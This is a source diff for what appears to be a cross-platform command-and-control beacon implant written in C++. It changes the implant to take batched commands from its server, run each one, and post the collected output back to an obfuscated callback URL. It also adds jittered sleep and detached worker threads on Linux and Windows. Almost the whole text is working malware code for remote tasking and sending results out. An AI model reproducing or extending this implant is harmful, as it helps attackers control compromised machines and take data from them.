@@ -8,22 +8,23 @@
 #include <cstdlib> 
 #include <ctime>
 
+
 #include "config.h"
-#include "urlObfuscation.h"
+#include "urlObfuscation.hpp"
 
 #ifdef __unix__
 #define OS "Linux"
-#include "../Linux/Beacon/beacon_commands.h"
-#include "../Linux/generic.h"
-#include <thread>
+#include "../Linux/Beacon/beacon_commands.hpp"
+#include "../Linux/generic.hpp"
 #include <chrono>
+#include <thread>
 #endif
 
 #ifdef WIN32
 #include <windows.h>
 #define OS "Windows"
-#include "../Windows/generic.h"
-#include "../Windows/Beacon/beacon_commands.h"
+#include "../Windows/generic.hpp"
+#include "../Windows/Beacon/beacon_commands.hpp"
 #endif
 
 
@@ -200,25 +201,26 @@ bool handleResponse(const std::string& response_body, int& timer, const std::str
     }
     std::cout << "Response: " << response_body << std::endl;
 
-    if (data.isMember("command")) {
-        std::string command = data["command"].asString();
-        if (data.isMember("command_uuid")) {
-            std::string command_uuid = data["command_uuid"].asString();
-            std::cout << "Command recieved: " << command << std::endl;
-            std::string output = command_handler(command, command_uuid);
+    if (data.isMember("commands")) {
+        Json::Value reports;
+        for (const auto& command : data["commands"]) {
+            std::string cmd = command["command"].asString();
+            std::string cmd_uuid = command["command_uuid"].asString();
+            std::string cmd_data = command["data"].asString();
+            std::string output = command_handler(cmd, cmd_data, cmd_uuid);
             Json::Value json_data;
             json_data["output"] = output;
-            json_data["command_uuid"] = command_uuid;
-            Json::StreamWriterBuilder writer;
-            std::string json_string = Json::writeString(writer, json_data);
-            std::string responseURL = generateResponse();
-            postRequest(responseURL, json_string);
-        } else {
-            return false;
+            json_data["command_uuid"] = cmd_uuid;
+            reports.append(json_data);
         }
+        Json::Value wrapped_reports;
+        wrapped_reports["reports"] = reports;
+        Json::StreamWriterBuilder writer;
+        std::string json_string = Json::writeString(writer, wrapped_reports);
+        std::string responseURL = generateResponse();
+        postRequest(responseURL, json_string);
         return true;
     }
-    
 
     if (data.isMember("timer")) {
         int newTimer = std::stoi(data["timer"].asString());
@@ -251,10 +253,38 @@ int beacon() {
         } else {
             try {
                 if (response_code == 200) {
-                    if (handleResponse(response_body, TIMER, ID)) {
-                        continue;
-                    }
-                }
+                    sleepTime = calculateSleepTime(TIMER, JITTER);
+                    #ifdef __unix__
+                        std::thread([response_body, sleepTime]() {
+                            sleepFor(sleepTime);
+                            if (!handleResponse(response_body, TIMER, ID)) {
+                                std::cerr << "Failed to send response" << std::endl;
+                            }
+                        }).detach();
+                    #elif _WIN32
+                        // Wrapper function for Windows thread
+                        auto threadFunc = [](LPVOID param) -> DWORD {
+                            auto data = static_cast<std::tuple<std::string, int, std::string>*>(param);
+                            const std::string& response_body = std::get<0>(*data);
+                            int sleepTime = std::get<1>(*data);
+                            const std::string& ID = std::get<2>(*data);
+                            sleepFor(sleepTime);
+                            if (!handleResponse(response_body, TIMER, ID)) {
+                                std::cerr << "Failed to send response" << std::endl;
+                            }
+                            delete data;
+                            return 0;
+                        };
+                        auto* threadData = new std::tuple<std::string, int, std::string>(response_body, sleepTime, ID);
+                        HANDLE thread = CreateThread(NULL, 0, threadFunc, threadData, 0, NULL);
+                        if (thread == NULL) {
+                            std::cerr << "Failed to create thread" << std::endl;
+                        } else {
+                            CloseHandle(thread);
+                        }
+                    #endif
+
+                }   
             } catch (const std::exception& e) {
                 std::cerr << "Exception: " << e.what() << std::endl;
             }
